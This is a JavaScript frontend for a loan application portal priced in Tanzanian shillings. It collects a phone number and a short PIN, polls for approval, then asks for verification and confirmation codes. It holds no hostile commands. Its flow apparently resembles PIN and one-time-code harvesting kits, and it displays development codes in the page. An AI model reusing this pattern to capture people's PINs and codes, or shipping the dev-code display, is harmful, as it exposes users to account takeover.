const state = {
  page: 1, applicationId: null, applicationNo: null, phone: "",
  portalPin: "", amount: 1000000, termMonths: 3,
  interestRate: 5, monthlyPayment: 0, totalRepayment: 0,
  verifyTimer: null, confirmTimer: null
};

const $ = id => document.getElementById(id);
const pages = [...document.querySelectorAll(".page")];
const stepEls = [...document.querySelectorAll(".step")];

function money(n) {
  return new Intl.NumberFormat("en-TZ", {
    style: "currency", currency: "TZS", maximumFractionDigits: 0
  }).format(Number(n || 0));
}

function showPage(page) {
  state.page = page;
  pages.forEach(p => p.classList.toggle("active", p.dataset.page === String(page)));
  const numeric = Number(page);
  stepEls.forEach((s, i) => {
    s.classList.toggle("active", Number.isFinite(numeric) && i === numeric - 1);
    s.classList.toggle("done", Number.isFinite(numeric) && i < numeric - 1);
  });
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function setError(id, message) {
  const el = $(id);
  el.textContent = message || "";
  el.classList.toggle("hidden", !message);
}

function startTimer(targetId, seconds, key) {
  clearInterval(state[key]);
  let remaining = seconds;
  $(targetId).textContent = remaining;
  state[key] = setInterval(() => {
    remaining -= 1;
    $(targetId).textContent = Math.max(remaining, 0);
    if (remaining <= 0) clearInterval(state[key]);
  }, 1000);
}

async function getConfig() {
  const r = await fetch("/api/config");
  const c = await r.json();
  state.interestRate = c.interestRate;
  state.amount = Number(c.defaultLoanAmount || 1000000);
  state.termMonths = Number(c.defaultTermMonths || 3);
}

async function issueVerificationCode() {
  const r = await fetch(`/api/applications/${state.applicationId}/send-verification-code`, {method:"POST"});
  const data = await r.json();
  if (!r.ok) throw new Error(data.error || "Could not send application code.");
  if (data.devCode) {
    $("devVerification").textContent = `DEVELOPMENT CODE: ${data.devCode}`;
    $("devVerification").classList.remove("hidden");
  }
  startTimer("verifyTimer", 30, "verifyTimer");
}

async function issueConfirmationCode() {
  const r = await fetch(`/api/applications/${state.applicationId}/send-confirmation-code`, {method:"POST"});
  const data = await r.json();
  if (!r.ok) throw new Error(data.error || "Could not send confirmation code.");
  if (data.devCode) {
    $("devConfirmation").textContent = `DEVELOPMENT CODE: ${data.devCode}`;
    $("devConfirmation").classList.remove("hidden");
  }
  startTimer("confirmTimer", 30, "confirmTimer");
}

$("loginForm").addEventListener("submit", async e => {
  e.preventDefault();
  setError("loginError", "");

  state.phone = $("phone").value.trim();
  state.portalPin = $("portalPin").value.trim();

  if (!/^[0-9+\s-]{9,20}$/.test(state.phone)) {
    return setError("loginError", "Enter a valid phone number.");
  }
  if (!/^\d{4,6}$/.test(state.portalPin)) {
    return setError("loginError", "Enter your 4–6 digit application PIN.");
  }

  const btn = $("startApplication");
  btn.disabled = true;

  try {
    const r = await fetch("/api/applications", {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({ phone: state.phone, portalPin: state.portalPin })
    });
    const data = await r.json();
    if (!r.ok) throw new Error(data.error || "Unable to create the application right now.");

    state.applicationId = data.applicationId;
    state.applicationNo = data.applicationNo;
    $("applicationNumber").textContent = data.applicationNo;
    $("approvalWaiting").classList.remove("hidden");
    $("phone").disabled = true;
    $("portalPin").disabled = true;
    btn.classList.add("hidden");

    await waitForApproval();
  } catch (err) {
    setError("loginError", err.message);
    btn.disabled = false;
  }
});

async function waitForApproval() {
  const started = Date.now();

  while (Date.now() - started < 10 * 60 * 1000) {
    try {
      const r = await fetch(`/api/applications/${state.applicationId}/status`);
      const data = await r.json();

      if (data.status === "APPROVED") {
        $("codeApplicationNumber").textContent = data.applicationNo || state.applicationNo;
        showPage(2);
        await issueVerificationCode();
        return;
      }

      if (data.status === "REJECTED") {
        return setError("loginError", "Your application was not approved. Please contact the lender for more information.");
      }
    } catch {}

    await new Promise(resolve => setTimeout(resolve, 3000));
  }

  setError("loginError", "Approval is taking longer than expected. Please try again shortly.");
}

$("verifyCodeBtn").addEventListener("click", async () => {
  setError("page2Error", "");
  try {
    const r = await fetch(`/api/applications/${state.applicationId}/verify-code`, {
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({code: $("verificationCode").value.trim()})
    });
    const data = await r.json();
    if (!r.ok) throw new Error(data.error || "Application code verification failed.");

    const application = await fetch(`/api/applications/${state.applicationId}/status`);
    const details = await application.json();

    state.amount = Number(details.amount || state.amount);
    state.termMonths = Number(details.termMonths || state.termMonths);
    state.monthlyPayment = Number(details.monthlyPayment || 0);
    state.totalRepayment = Number(details.totalRepayment || 0);

    $("finalAmount").textContent = money(state.amount);
    $("finalTerm").textContent = `${state.termMonths} Months`;
    $("finalMonthly").textContent = money(state.monthlyPayment);
    $("finalTotal").textContent = money(state.totalRepayment);

    if (data.devCode) {
      $("devConfirmation").textContent = `DEVELOPMENT CODE: ${data.devCode}`;
      $("devConfirmation").classList.remove("hidden");
    }

    showPage(3);
    startTimer("confirmTimer", 30, "confirmTimer");
  } catch (err) {
    setError("page2Error", err.message);
  }
});

$("resendVerification").addEventListener("click", async () => {
  setError("page2Error", "");
  try {
    await issueVerificationCode();
    $("verificationCode").value = "";
  } catch (err) {
    setError("page2Error", err.message);
  }
});

$("confirmBtn").addEventListener("click", async () => {
  setError("page3Error", "");
  try {
    const r = await fetch(`/api/applications/${state.applicationId}/confirm`, {
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({code: $("confirmationCode").value.trim()})
    });
    const data = await r.json();
    if (!r.ok) throw new Error(data.error || "Confirmation failed.");
    $("successNumber").textContent = data.applicationNo;
    showPage("success");
  } catch (err) {
    setError("page3Error", err.message);
  }
});

$("resendConfirmation").addEventListener("click", async () => {
  setError("page3Error", "");
  try {
    await issueConfirmationCode();
    $("confirmationCode").value = "";
  } catch (err) {
    setError("page3Error", err.message);
  }
});

getConfig().catch(() => {});
